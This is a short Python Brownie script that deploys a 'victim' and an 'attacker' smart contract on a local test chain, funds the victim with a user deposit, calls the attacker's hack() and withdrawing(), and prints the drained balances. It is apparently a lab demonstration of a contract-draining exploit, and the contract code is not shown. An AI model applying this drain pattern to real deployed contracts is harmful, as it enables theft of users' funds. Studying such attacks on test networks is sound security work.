from brownie import victim, attacker, accounts, web3
from web3 import Web3

hacker = accounts[0]
user = accounts[1]


def deploy():
    c1 = victim.deploy({'from': hacker})
    c2 = attacker.deploy(c1.address, {'from': hacker})
    print("Deployed.")
    tx = c1.deposit({'from': user, 'value': 3*10**18})
    tx.wait(1)
    print(tx.info())
    return c1, c2


def main():
    c1, c2 = deploy()
    print("*" * 100)
    tx = c2.hack({'from': hacker, 'value': 1*10**18})
    print(tx.info())
    print("*" * 100)
    c2.withdrawing({'from': hacker})
    print("Contract balance:", Web3.fromWei(c1.balance(), "ether"))
    print("Hacker balance:", Web3.fromWei(hacker.balance(), "ether"))
